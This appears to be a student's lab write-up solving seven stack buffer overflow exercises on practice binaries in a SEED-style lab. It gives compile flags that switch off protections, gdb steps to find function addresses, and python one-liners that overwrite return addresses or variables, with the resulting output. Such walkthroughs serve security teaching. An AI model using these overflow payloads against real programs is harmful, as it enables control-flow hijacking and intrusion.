# bof1

step1:
```bash
seed@68a4b6750ecf:~/seclabs$ gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```

step2:
```bash
seed@68a4b6750ecf:~/seclabs$ gdb -q bof1.out
```

step3:
```bash
gdb-peda$ disas secretFunc
```

step4:
```bash
save address secretFunc: 0x0804846b
```

step5:
```bash
seed@68a4b6750ecf:~/seclabs$ python -c "print('a'*204 +'\x6b\x84\x04\x08')" | ./bof1.out
```
**result:** <br>
Missing arguments  
Enter text:Congratulation!  
Segmentation fault  

# bof2
step1 and step2  similar bof1

step3:
```bash
seed@68a4b6750ecf:~/seclabs$ python -c "print('a'*40 + '\xef\xbe\xad\xde')" | ./bof2.out
```

**result:**   
[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�    
[check] 0xdeadbeef   
Yeah! You win!   

# bof3
step1 and step2  similar bof1

step3:
```bash
gdb-peda$ disas shell
```

step4:
```bash
save address shell: 0x0804845b 
```

steo5:
```bash
seed@68a4b6750ecf:~/seclabs$ python -c "print('a'*128 + '\x5b\x84\x04\x08')" | ./bof3.out
```

**result:**  
You made it! The shell() function is executed

# ctf

step1 and step2  similar bof1

step3:
```bash
gdb-peda$ disas myfunc
```

step4:
```bash
save address myfunc: 0x0804851b ,save address myfunc: 0x080483e0
```

step5:
```bash
seed@ac432deba69f:~/seclabs$ touch flag1.txt | ./ctf.out $(python -c "print('a'*104 + '\x1b\x85\x04\x08'+ '\xe0\x83\x04\x08' + '\x11\x12\x08\x04'+'\x62\x42\x64\x44')")
```

**result:**  
myfunc is reachedYou got the flag

# flag

step1 and step2  similar bof1

step3:
```bash
seed@ac432deba69f:~/seclabs$ ./flag.out $(python -c "print('a'*17)")
```

**result:**  
Modified

# pattern

step1 and step2 similar bof1

step3:
```bash
seed@ac432deba69f:~/seclabs$ ./pattern.out $(python -c "print('a'*16 + '\x62\x42\x61\x41')")
```
**result:**  
Correct pattern

# flow

step1 and step2 similar bof1

step3:
```bash
gdb-peda$ disas change
```

step4:
```bash
save address change: 0x0804843b
```
step5:
```bash
seed@5528c08120d5:~/seclabs$ ./flow.out $(python -c "print('a'*20 + '\x3b\x84\x04\x08')")
```
**result:**  
code flow has been modified  
Segmentation fault
